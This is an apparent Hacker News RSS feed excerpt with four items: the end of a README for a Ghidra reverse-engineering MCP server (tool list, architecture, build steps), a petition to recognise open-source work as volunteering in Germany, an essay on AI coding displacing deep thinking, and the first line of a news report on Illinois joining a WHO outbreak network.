<p dir="auto"><h2 tabindex="-1" dir="auto">🛠️ API Reference</h2><a id="user-content-️-api-reference" aria-label="Permalink: 🛠️ API Reference" href="#️-api-reference"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Core Operations</h3><a id="user-content-core-operations" aria-label="Permalink: Core Operations" href="#core-operations"></a></p>
<ul dir="auto">
<li><code>check_connection</code> - Verify MCP connectivity</li>
<li><code>get_metadata</code> - Program metadata and info</li>
<li><code>get_version</code> - Server version information</li>
<li><code>get_entry_points</code> - Binary entry points discovery</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Function Analysis</h3><a id="user-content-function-analysis" aria-label="Permalink: Function Analysis" href="#function-analysis"></a></p>
<ul dir="auto">
<li><code>list_functions</code> - List all functions (paginated)</li>
<li><code>search_functions_by_name</code> - Search functions by name/pattern</li>
<li><code>search_functions_enhanced</code> - Advanced function search with filters</li>
<li><code>decompile_function</code> - Decompile function to C pseudocode</li>
<li><code>get_decompiled_code</code> - Get decompiled code by address</li>
<li><code>get_function_callers</code> - Get function callers</li>
<li><code>get_function_callees</code> - Get function callees</li>
<li><code>get_function_call_graph</code> - Function relationship graph</li>
<li><code>get_full_call_graph</code> - Complete call graph for program</li>
<li><code>analyze_function_complete</code> - Comprehensive function analysis</li>
<li><code>analyze_function_completeness</code> - Documentation completeness score</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Memory &amp; Data</h3><a id="user-content-memory--data" aria-label="Permalink: Memory &amp; Data" href="#memory--data"></a></p>
<ul dir="auto">
<li><code>list_segments</code> - Memory segments and layout</li>
<li><code>get_function_by_address</code> - Function at address</li>
<li><code>disassemble_function</code> - Disassembly listing</li>
<li><code>disassemble_bytes</code> - Raw byte disassembly</li>
<li><code>get_xrefs_to</code> - Cross-references to address</li>
<li><code>get_xrefs_from</code> - Cross-references from address</li>
<li><code>get_bulk_xrefs</code> - Bulk cross-reference lookup</li>
<li><code>analyze_data_region</code> - Analyze memory region structure</li>
<li><code>inspect_memory_content</code> - View raw memory content</li>
<li><code>detect_array_bounds</code> - Detect array boundaries</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Cross-Binary Documentation (v1.9.4+)</h3><a id="user-content-cross-binary-documentation-v194" aria-label="Permalink: Cross-Binary Documentation (v1.9.4+)" href="#cross-binary-documentation-v194"></a></p>
<ul dir="auto">
<li><code>get_function_hash</code> - SHA-256 hash of normalized function opcodes</li>
<li><code>get_bulk_function_hashes</code> - Paginated bulk hashing with filter</li>
<li><code>get_function_documentation</code> - Export complete function documentation</li>
<li><code>apply_function_documentation</code> - Import documentation to target function</li>
<li><code>build_function_hash_index</code> - Build persistent JSON index</li>
<li><code>lookup_function_by_hash</code> - Find matching functions in index</li>
<li><code>propagate_documentation</code> - Apply docs to all matching instances</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Data Types &amp; Structures</h3><a id="user-content-data-types--structures" aria-label="Permalink: Data Types &amp; Structures" href="#data-types--structures"></a></p>
<ul dir="auto">
<li><code>list_data_types</code> - Available data types</li>
<li><code>search_data_types</code> - Search for data types</li>
<li><code>create_struct</code> - Create custom structure</li>
<li><code>add_struct_field</code> - Add field to structure</li>
<li><code>modify_struct_field</code> - Modify existing field</li>
<li><code>remove_struct_field</code> - Remove field from structure</li>
<li><code>create_enum</code> - Create enumeration</li>
<li><code>get_enum_values</code> - Get enumeration values</li>
<li><code>create_array_type</code> - Create array data type</li>
<li><code>apply_data_type</code> - Apply type to address</li>
<li><code>delete_data_type</code> - Delete a data type</li>
<li><code>consolidate_duplicate_types</code> - Merge duplicate types</li>
<li><code>get_valid_data_types</code> - Get list of valid Ghidra types</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Symbols &amp; Labels</h3><a id="user-content-symbols--labels" aria-label="Permalink: Symbols &amp; Labels" href="#symbols--labels"></a></p>
<ul dir="auto">
<li><code>list_imports</code> - Imported symbols and libraries</li>
<li><code>list_exports</code> - Exported symbols and functions</li>
<li><code>list_external_locations</code> - External location references</li>
<li><code>list_strings</code> - Extracted strings with analysis</li>
<li><code>list_namespaces</code> - Available namespaces</li>
<li><code>list_globals</code> - Global variables</li>
<li><code>create_label</code> - Create label at address</li>
<li><code>batch_create_labels</code> - Bulk label creation</li>
<li><code>delete_label</code> - Delete label at address</li>
<li><code>batch_delete_labels</code> - Bulk label deletion</li>
<li><code>rename_label</code> - Rename existing label</li>
<li><code>rename_or_label</code> - Rename or create label</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Renaming &amp; Documentation</h3><a id="user-content-renaming--documentation" aria-label="Permalink: Renaming &amp; Documentation" href="#renaming--documentation"></a></p>
<ul dir="auto">
<li><code>rename_function</code> - Rename function by name</li>
<li><code>rename_function_by_address</code> - Rename function by address</li>
<li><code>rename_data</code> - Rename data item</li>
<li><code>rename_variables</code> - Rename function variables</li>
<li><code>rename_global_variable</code> - Rename global variable</li>
<li><code>rename_external_location</code> - Rename external reference</li>
<li><code>batch_rename_function_components</code> - Bulk renaming</li>
<li><code>set_decompiler_comment</code> - Set decompiler comment</li>
<li><code>set_disassembly_comment</code> - Set disassembly comment</li>
<li><code>set_plate_comment</code> - Set function plate comment</li>
<li><code>get_plate_comment</code> - Get function plate comment</li>
<li><code>batch_set_comments</code> - Bulk comment setting</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Type System</h3><a id="user-content-type-system" aria-label="Permalink: Type System" href="#type-system"></a></p>
<ul dir="auto">
<li><code>set_function_prototype</code> - Set function signature</li>
<li><code>set_local_variable_type</code> - Set variable type</li>
<li><code>set_parameter_type</code> - Set parameter type</li>
<li><code>batch_set_variable_types</code> - Bulk type setting</li>
<li><code>set_variable_storage</code> - Control variable storage location</li>
<li><code>set_function_no_return</code> - Mark function as non-returning</li>
<li><code>list_calling_conventions</code> - Available calling conventions</li>
<li><code>get_function_variables</code> - Get all function variables</li>
<li><code>get_function_labels</code> - Get labels in function</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Ghidra Script Management</h3><a id="user-content-ghidra-script-management" aria-label="Permalink: Ghidra Script Management" href="#ghidra-script-management"></a></p>
<ul dir="auto">
<li><code>list_scripts</code> - List available scripts</li>
<li><code>run_script</code> - Run a script</li>
<li><code>list_ghidra_scripts</code> - List custom Ghidra scripts</li>
<li><code>save_ghidra_script</code> - Save new script</li>
<li><code>get_ghidra_script</code> - Get script contents</li>
<li><code>run_ghidra_script</code> - Execute Ghidra script</li>
<li><code>update_ghidra_script</code> - Update existing script</li>
<li><code>delete_ghidra_script</code> - Delete script</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Multi-Program Support</h3><a id="user-content-multi-program-support" aria-label="Permalink: Multi-Program Support" href="#multi-program-support"></a></p>
<ul dir="auto">
<li><code>list_open_programs</code> - List all open programs</li>
<li><code>get_current_program_info</code> - Current program details</li>
<li><code>switch_program</code> - Switch active program</li>
<li><code>list_project_files</code> - List project files</li>
<li><code>open_program</code> - Open program from project</li>
<li><code>compare_programs_documentation</code> - Compare documentation between programs</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Analysis Tools</h3><a id="user-content-analysis-tools" aria-label="Permalink: Analysis Tools" href="#analysis-tools"></a></p>
<ul dir="auto">
<li><code>find_next_undefined_function</code> - Find undefined functions</li>
<li><code>find_undocumented_by_string</code> - Find functions by string reference</li>
<li><code>batch_string_anchor_report</code> - String anchor analysis</li>
<li><code>search_byte_patterns</code> - Search for byte patterns</li>
<li><code>get_assembly_context</code> - Get assembly context</li>
<li><code>analyze_struct_field_usage</code> - Analyze structure field access</li>
<li><code>get_field_access_context</code> - Get field access patterns</li>
<li><code>create_function</code> - Create function at address</li>
<li><code>get_function_jump_target_addresses</code> - Get jump targets</li>
</ul>
<p dir="auto">See <a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/README.md">docs/README.md</a> for complete documentation.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🏗️ Architecture</h2><a id="user-content-️-architecture" aria-label="Permalink: 🏗️ Architecture" href="#️-architecture"></a></p>
<div data-snippet-clipboard-copy-content="┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   AI/Automation │◄──►│   MCP Bridge    │◄──►│  Ghidra Plugin  │
│     Tools       │    │ (bridge_mcp_    │    │ (GhidraMCP.jar) │
│  (Claude, etc.) │    │  ghidra.py)     │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
        │                       │                       │
   MCP Protocol            HTTP REST              Ghidra API
   (stdio/SSE)          (localhost:8080)      (Program, Listing)"><pre><code>┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   AI/Automation │◄──►│   MCP Bridge    │◄──►│  Ghidra Plugin  │
│     Tools       │    │ (bridge_mcp_    │    │ (GhidraMCP.jar) │
│  (Claude, etc.) │    │  ghidra.py)     │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
        │                       │                       │
   MCP Protocol            HTTP REST              Ghidra API
   (stdio/SSE)          (localhost:8080)      (Program, Listing)
</code></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Components</h3><a id="user-content-components" aria-label="Permalink: Components" href="#components"></a></p>
<ul dir="auto">
<li><strong>bridge_mcp_ghidra.py</strong> - Python MCP server that translates MCP protocol to HTTP calls</li>
<li><strong>GhidraMCP.jar</strong> - Ghidra plugin that exposes analysis capabilities via HTTP</li>
<li><strong>ghidra_scripts/</strong> - Collection of 70+ automation scripts for common tasks</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🔧 Development</h2><a id="user-content--development" aria-label="Permalink: 🔧 Development" href="#-development"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building from Source</h3><a id="user-content-building-from-source" aria-label="Permalink: Building from Source" href="#building-from-source"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Build the plugin (skip integration tests)
mvn clean package assembly:single -DskipTests

# Deploy to Ghidra
.\deploy-to-ghidra.ps1"><pre><span><span>#</span> Build the plugin (skip integration tests)</span>
mvn clean package assembly:single -DskipTests

<span><span>#</span> Deploy to Ghidra</span>
.<span>\d</span>eploy-to-ghidra.ps1</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Project Structure</h3><a id="user-content-project-structure" aria-label="Permalink: Project Structure" href="#project-structure"></a></p>
<div data-snippet-clipboard-copy-content="ghidra-mcp/
├── bridge_mcp_ghidra.py     # MCP server (Python)
├── src/main/java/           # Ghidra plugin (Java)
├── lib/                     # Ghidra library dependencies
├── ghidra_scripts/          # 70+ automation scripts
├── docs/                    # Documentation
│   ├── prompts/            # AI workflow prompts
│   ├── releases/           # Version release notes
│   └── project-management/ # Project docs
├── examples/                # Example usage
└── scripts/                 # Build/utility scripts"><pre><code>ghidra-mcp/
├── bridge_mcp_ghidra.py     # MCP server (Python)
├── src/main/java/           # Ghidra plugin (Java)
├── lib/                     # Ghidra library dependencies
├── ghidra_scripts/          # 70+ automation scripts
├── docs/                    # Documentation
│   ├── prompts/            # AI workflow prompts
│   ├── releases/           # Version release notes
│   └── project-management/ # Project docs
├── examples/                # Example usage
└── scripts/                 # Build/utility scripts
</code></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Library Dependencies</h3><a id="user-content-library-dependencies" aria-label="Permalink: Library Dependencies" href="#library-dependencies"></a></p>
<p dir="auto">The <code>lib/</code> folder must contain Ghidra JAR files for compilation. Run the provided script to copy them from your Ghidra installation:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Windows
copy-ghidra-libs.bat &quot;C:\path\to\ghidra_12.0.2_PUBLIC&quot;

# Or manually copy from your Ghidra installation"><pre><span><span>#</span> Windows</span>
copy-ghidra-libs.bat <span><span>"</span>C:\path\to\ghidra_12.0.2_PUBLIC<span>"</span></span>

<span><span>#</span> Or manually copy from your Ghidra installation</span></pre></div>
<p dir="auto"><strong>Required Libraries (14 JARs, ~37MB):</strong></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Library</th>
<th>Source Path</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Base.jar</strong></td>
<td><code>Features/Base/lib/</code></td>
<td>Core Ghidra functionality</td>
</tr>
<tr>
<td><strong>Decompiler.jar</strong></td>
<td><code>Features/Decompiler/lib/</code></td>
<td>Decompilation engine</td>
</tr>
<tr>
<td><strong>PDB.jar</strong></td>
<td><code>Features/PDB/lib/</code></td>
<td>Microsoft PDB symbol support</td>
</tr>
<tr>
<td><strong>FunctionID.jar</strong></td>
<td><code>Features/FunctionID/lib/</code></td>
<td>Function identification</td>
</tr>
<tr>
<td><strong>SoftwareModeling.jar</strong></td>
<td><code>Framework/SoftwareModeling/lib/</code></td>
<td>Program model API</td>
</tr>
<tr>
<td><strong>Project.jar</strong></td>
<td><code>Framework/Project/lib/</code></td>
<td>Project management</td>
</tr>
<tr>
<td><strong>Docking.jar</strong></td>
<td><code>Framework/Docking/lib/</code></td>
<td>UI docking framework</td>
</tr>
<tr>
<td><strong>Generic.jar</strong></td>
<td><code>Framework/Generic/lib/</code></td>
<td>Generic utilities</td>
</tr>
<tr>
<td><strong>Utility.jar</strong></td>
<td><code>Framework/Utility/lib/</code></td>
<td>Core utilities</td>
</tr>
<tr>
<td><strong>Gui.jar</strong></td>
<td><code>Framework/Gui/lib/</code></td>
<td>GUI components</td>
</tr>
<tr>
<td><strong>FileSystem.jar</strong></td>
<td><code>Framework/FileSystem/lib/</code></td>
<td>File system support</td>
</tr>
<tr>
<td><strong>Graph.jar</strong></td>
<td><code>Framework/Graph/lib/</code></td>
<td>Graph/call graph analysis</td>
</tr>
<tr>
<td><strong>DB.jar</strong></td>
<td><code>Framework/DB/lib/</code></td>
<td>Database operations</td>
</tr>
<tr>
<td><strong>Emulation.jar</strong></td>
<td><code>Framework/Emulation/lib/</code></td>
<td>P-code emulation</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<blockquote>
<p dir="auto"><strong>Note</strong>: Libraries are NOT included in the repository (see <code>.gitignore</code>). You must copy them from your Ghidra installation before building.</p>
</blockquote>
<p dir="auto"><h3 tabindex="-1" dir="auto">Development Features</h3><a id="user-content-development-features" aria-label="Permalink: Development Features" href="#development-features"></a></p>
<ul dir="auto">
<li><strong>Automated Deployment</strong>: Version-aware deployment script</li>
<li><strong>Batch Operations</strong>: Reduces API calls by 93%</li>
<li><strong>Atomic Transactions</strong>: All-or-nothing semantics</li>
<li><strong>Comprehensive Logging</strong>: Debug and trace capabilities</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">📚 Documentation</h2><a id="user-content--documentation" aria-label="Permalink: 📚 Documentation" href="#-documentation"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Core Documentation</h3><a id="user-content-core-documentation" aria-label="Permalink: Core Documentation" href="#core-documentation"></a></p>
<ul dir="auto">
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/README.md">Documentation Index</a> - Complete documentation navigation</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/PROJECT_STRUCTURE.md">Project Structure</a> - Project organization guide</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/NAMING_CONVENTIONS.md">Naming Conventions</a> - Code naming standards</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/HUNGARIAN_NOTATION.md">Hungarian Notation</a> - Variable naming guide</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">AI Workflow Prompts</h3><a id="user-content-ai-workflow-prompts" aria-label="Permalink: AI Workflow Prompts" href="#ai-workflow-prompts"></a></p>
<ul dir="auto">
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/prompts/README.md">Prompts Overview</a> - AI prompting system guide</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/prompts/FUNCTION_DOC_WORKFLOW_V4.md">Function Documentation Workflow</a> - Complete workflow</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/prompts/QUICK_START_PROMPT.md">Quick Start Prompt</a> - Simplified beginner workflow</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/prompts/CROSS_VERSION_MATCHING_COMPREHENSIVE.md">Cross-Version Matching</a> - Hash-based matching</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Release History</h3><a id="user-content-release-history" aria-label="Permalink: Release History" href="#release-history"></a></p>
<ul dir="auto">
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/CHANGELOG.md">Complete Changelog</a> - All version release notes</li>
<li><a href="https://github.com/bethington/ghidra-mcp/blob/main/docs/releases">Release Notes</a> - Detailed release documentation</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🤝 Contributing</h2><a id="user-content--contributing" aria-label="Permalink: 🤝 Contributing" href="#-contributing"></a></p>
<p dir="auto">See <a href="https://github.com/bethington/ghidra-mcp/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a> for detailed contribution guidelines.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Quick Start</h3><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<ol dir="auto">
<li>Fork the repository</li>
<li>Create a feature branch (<code>git checkout -b feature/amazing-feature</code>)</li>
<li>Build and test your changes (<code>mvn clean package assembly:single -DskipTests</code>)</li>
<li>Update documentation as needed</li>
<li>Commit your changes (<code>git commit -m 'Add amazing feature'</code>)</li>
<li>Push to the branch (<code>git push origin feature/amazing-feature</code>)</li>
<li>Open a Pull Request</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">📄 License</h2><a id="user-content--license" aria-label="Permalink: 📄 License" href="#-license"></a></p>
<p dir="auto">This project is licensed under the Apache License 2.0 - see the <a href="https://github.com/bethington/ghidra-mcp/blob/main/LICENSE">LICENSE</a> file for details.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🏆 Production Status</h2><a id="user-content--production-status" aria-label="Permalink: 🏆 Production Status" href="#-production-status"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Version</strong></td>
<td>2.0.0</td>
</tr>
<tr>
<td><strong>MCP Tools</strong></td>
<td>110 fully implemented</td>
</tr>
<tr>
<td><strong>Compilation</strong></td>
<td>✅ 100% success</td>
</tr>
<tr>
<td><strong>Batch Efficiency</strong></td>
<td>93% API call reduction</td>
</tr>
<tr>
<td><strong>Ghidra Scripts</strong></td>
<td>70+ automation scripts</td>
</tr>
<tr>
<td><strong>Documentation</strong></td>
<td>Comprehensive with AI prompts</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">See <a href="https://github.com/bethington/ghidra-mcp/blob/main/CHANGELOG.md">CHANGELOG.md</a> for version history and release notes.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🙏 Acknowledgments</h2><a id="user-content--acknowledgments" aria-label="Permalink: 🙏 Acknowledgments" href="#-acknowledgments"></a></p>
<ul dir="auto">
<li><strong>Ghidra Team</strong> - For the incredible reverse engineering platform</li>
<li><strong>Model Context Protocol</strong> - For the standardized AI integration framework</li>
<li><strong>Contributors</strong> - For testing, feedback, and improvements</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">🔗 Related Projects</h2><a id="user-content--related-projects" aria-label="Permalink: 🔗 Related Projects" href="#-related-projects"></a></p>
<ul dir="auto">
<li><a href="https://github.com/bethington/re-universe">re-universe</a> — Ghidra BSim PostgreSQL platform for large-scale binary similarity analysis. Pairs perfectly with GhidraMCP for AI-driven reverse engineering workflows.</li>
<li><a href="https://github.com/bethington/cheat-engine-server-python">cheat-engine-server-python</a> — MCP server for dynamic memory analysis and debugging.</li>
</ul>
<hr>
<p dir="auto"><strong>Ready for production deployment with enterprise-grade reliability and comprehensive binary analysis capabilities.</strong></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Petition for Recognition of Work on Open-Source as Volunteering in Germany (201 pts)]]></title>
            <link>https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany</link>
            <guid>46881568</guid>
            <pubDate>Wed, 04 Feb 2026 04:46:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany">https://www.openpetition.de/petition/online/recognition-of-work-on-open-source-as-volunteering-in-germany</a>, See on <a href="https://news.ycombinator.com/item?id=46881568">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<div dir="ltr" lang="en">
			<p>
				<strong>Petition richtet sich an:</strong>
									German Bundestag, Petition Committee							</p>

			<!--marker--><p>Open-Source-Software builds the foundations of digital infrastructure in big parts - in administration, economy, science and daily life. Even the current <b>coalition agreement</b> of the <b>Federal Government</b> mentions Open-Source-Software as a fundamental building block for the achievement of <b>digital sovereignty</b>.</p><p>However, the work done by thousands of volunteers for this goal is <b>not recognised as volunteering</b>, neither fiscally nor in terms of funding. This imbalance between societal importance and legal status has to be corrected.</p><p>Therefore, as an active contributor to Open-Source-Projects, I call for work on Open-Source to be recognised as <b>volunteering for the common good</b> – of equal rank as volunteer work for associations, youth work or ambulance service.</p>		</div>

					<h4>Begründung</h4>

			<div dir="ltr" lang="en">
				<!--marker--><p><b>1. Open-Source contributes evidently to the common good</b></p><ul><li>It is creating <b>free, transparent and auditable software</b> that is available for everyone.</li><li>Critical systems like <b>internet protocols, security libraries, health IT, AI frameworks, energy management, education technologies </b>and<b> communication tools</b> are based significantly on volunteer contributions.</li><li>Without this work, Germany would be <b>digitally more dependent, less secure </b>and<b> less inventive.</b></li></ul><p>Orientation on the common good is a central criterion for volunteering – and Open-Source fulfils it to the highest degree.</p><p><b>2. This work predominantly happens unpaid – and is voluntary civilian commitment</b></p><ul><li>The majority of all work on development, maintenance and documentation happens voluntarily in leisure time.</li><li>Contributors take responsibility for security, stability and advancement of central software components, without getting paid and often recognised.</li><li>The commitment is <b>comparable to work in associations for the public good</b>, but digitally.</li></ul><p>The legal equalisation with traditional volunteering is therefore coherent.</p><p><b>3. Societal dependence without appreciation</b></p><ul><li>State facilities, town councils, schools and enterprises <b>profit directly</b> from Open-Source libraries, frameworks and tools.</li><li>Security vulnerabilities like "Heartbleed" or "Log4Shell" have shown the importance of work by maintainers for the <b>protection of the public</b>.</li><li>Concurrently, resources and structures are lacking, as the work is <b>not formally recognised as volunteering</b> – and does therefore <i>not receive taxable or organisational benefits</i>.</li></ul><p>This creates an <b>imbalance of responsibilities</b> that lies on few volunteers, while millions of users are profiting.</p><p><b>4. Recognition as volunteering would create legal clarity</b><br>Possible results of formal recognition:</p><ul><li><b>Compensations </b>could be <b>paid tax-exempt </b>(Ehrenamtspauschale/Übungsleiterpauschale).</li><li><b>Open-Source projects for the common good</b> could more easily receive a classification as per §52 AO.</li><li>Contributors could get a better position in issues of liability (similar to §31a BGB for an Association's Board).</li><li>Projects could legally reimburse expenses and issue donation receipts.</li></ul><p>This creates <b>transparency, legal clarity and sustainability</b> in digital volunteer work.</p><p><b>5. Digitalisation needs competent volunteers – and those deserve funding</b></p><ul><li>Open-Source commitment requires high technical competence</li><li>Volunteer developers perform work, that companies would otherwise need to buy for high hourly rates.</li><li>The state invests billions in digitalisation, but ignores the people who maintain the technological foundation <b>voluntarily</b>.</li></ul><p>Recognition as volunteer work would be a <b>cost-efficient contribution to digital sovereignty</b> in Germany.</p><p><b>6. Germany limps behind internationally</b><br>Other countries are already funding commitment to Open-Source through: </p><ul><li>Taxable benefits</li><li>Institutional support</li><li>Recognition of software development for the public good</li></ul><p>Germany is risking to fall behind in international competition, if volunteers in the digital realm are <b>structurally disadvantaged</b> further.</p>			</div>
		
					
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I miss thinking hard (1166 pts)]]></title>
            <link>https://www.jernesto.com/articles/thinking_hard</link>
            <guid>46881264</guid>
            <pubDate>Wed, 04 Feb 2026 03:54:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jernesto.com/articles/thinking_hard">https://www.jernesto.com/articles/thinking_hard</a>, See on <a href="https://news.ycombinator.com/item?id=46881264">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p>Before you read this post, ask yourself a question: <strong>When was the last time you truly thought hard?</strong></p>

<p>By “thinking hard,” I mean encountering a specific, difficult problem and spending multiple days just sitting with it to overcome it. </p>

<p>a) All the time. 
b) Never. 
c) Somewhere in between.</p>

<p>If your answer is (a) or (b), this post isn't for you. But if, like me, your response is (c), you might get something out of this, if only the feeling that you aren't alone.</p>

<p>First, a disclaimer: this post has no answers, not even suggestions. It is simply a way to vent something I've been feeling for the last few months.</p>

<h3 id="the-builder-and-the-thinker">The Builder and The Thinker</h3>

<p>I believe my personality is built on two primary traits:</p>

<ol>
<li><p><strong>The Builder</strong> (The desire to create, ship, and be pragmatic).</p></li>
<li><p><strong>The Thinker</strong> (The need for deep, prolonged mental struggle).</p></li>
</ol>

<p>The builder is pretty self explanatory, it’s motivated by velocity and utility. It is the part of me that craves the transition from “idea” to “reality.” It loves the dopamine hit of a successful deploy, the satisfaction of building systems to solve real problems, and the knowledge that someone, somewhere, is using my tool.</p>

<p>To explain the Thinker , I need to go back to my university days studying physics. Every now and then, we would get homework problems that were significantly harder than average. Even if you had a decent grasp of the subject, just coming up with an approach was difficult.</p>

<p>I observed that students fell into three categories when facing these problems (well, four, if you count the 1% of geniuses for whom no problem was too hard).</p>

<ul>
<li><p><strong>Type 1:</strong> The majority. After a few tries, they gave up and went to the professor or a TA for help.</p></li>
<li><p><strong>Type 2:</strong> The Researchers. They went to the library to look for similar problems or insights to make the problem approachable. They usually succeeded.</p></li>
<li><p><strong>Type 3:</strong> The Thinkers.</p></li>
</ul>

<p>I fell into the third category, which, in my experience, was almost as rare as the genius 1%. My method was simply to think. To think hard and long. Often for several days or weeks, all my non-I/O brain time was relentlessly chewing on possible ways to solve the problem, even while I was asleep.</p>

<p>This method never failed me. I always felt that deep prolonged thinking was my superpower. I might not be as fast or naturally gifted as the top 1%, but given enough time, I was confident I could solve anything. I felt a deep satisfaction in that process.</p>

<h3 id="the-conflict-with-ai">The Conflict with AI</h3>

<p>That satisfaction is why software engineering was initially so gratifying. It hit the right balance. It satisfied <strong>The Builder</strong> (feeling productive and pragmatic by creating useful things) and <strong>The Thinker</strong> (solving really hard problems). Thinking back, the projects where I grew the most as an engineer were always the ones with a good number of really hard problems that needed creative solutions.</p>

<p>But recently, the number of times I truly ponder a problem for more than a couple of hours has decreased tremendously.</p>

<p>Yes, <strong>I blame AI for this</strong>.</p>

<p>I am currently writing much more, and more complicated software than ever, yet I feel I am not growing as an engineer at all. When I started meditating on why I felt “stuck,” I realized I am starving <strong>The Thinker</strong>.</p>

<p>“Vibe coding” satisfies the Builder. It feels great to see to pass from idea to reality in a fraction of a time that would take otherwise. But it has drastically cut the times I need to came up with creative solutions for technical problems. I know many people who are purely Builders, for them this era is the best thing that ever happened. But for me, something is missing.</p>

<h3 id="the-trap-of-pragmatism">The Trap of Pragmatism</h3>

<p>I know what you might be thinking: "If you can ‘vibe code’ your way through it, the problem wasn’t actually hard."</p>

<p>I think that misses the point.  It’s not that AI is good for hard problems, it’s not even that good for easy problems. I’m confident that my third manual rewrite of a module would be much better than anything the AI can output. But I am also a pragmatist.</p>

<p>If I can get a solution that is “close enough” in a fraction of the time and effort, it is irrational not to take the AI route. And that is the real problem: <strong>I cannot simply turn off my pragmatism.</strong></p>

<p>At the end of the day, I am a Builder. I like building things. The faster I build, the better. Even if I wanted to reject AI and go back to the days where the Thinker's needs were met by coding, the Builder in me would struggle with the inefficiency.</p>

<p>Even though the AI almost certainly won't come up with a 100% satisfying solution, the 70% solution it achieves usually hits the “good enough” mark.</p>

<h3 id="so-what-now">So, what now?</h3>

<p>To be honest, I don’t know. I am still figuring it out.</p>

<p>I'm not sure if my two halves can be satisfied by coding anymore. You can always aim for harder projects, hoping to find problems where AI fails completely. I still encounter those occasionally, but the number of problems requiring deep creative solutions feels like it is diminishing rapidly.</p>

<p>I have tried to get that feeling of mental growth outside of coding. I tried getting back in touch with physics, reading old textbooks. But that wasn’t successful either. It is hard to justify spending time and mental effort solving physics problems that aren’t relevant or state-of-the-art when I know I could be building things.</p>

<p>My Builder side won’t let me just sit and think about unsolved problems, and my Thinker side is starving while I vibe-code. I am not sure if there will ever be a time again when both needs can be met at once.  </p>

<p> "Now we have the right to give this being the well-known name that always designates what no power of imagination, no flight of the boldest fantasy, no intently devout heart, no abstract thinking however profound, no enraptured and transported spirit has ever attained: God. But this basic unity is of the past; it no longer is. It has, by changing its being, totally and completely shattered itself. God has died and his death was the life of the world." <br>
-  Philipp Mainländer </p>

			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Illinois joins WHO global outbreak network after U.S. withdraws (131 pts)]]></title>
            <link>https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/</link>
            <guid>46879447</guid>
            <pubDate>Wed, 04 Feb 2026 00:15:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/">https://capitolnewsillinois.com/news/illinois-joins-who-global-outbreak-network-after-u-s-withdraws/</a>, See on <a href="https://news.ycombinator.com/item?id=46879447">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
								
<p>Illinois will join the World Health Organization’s Global Outbreak Alert and Response Network, or GOARN, to counterbalance the federal government’s withdrawal, Gov. JB Pritzker announced Tuesday.</p>
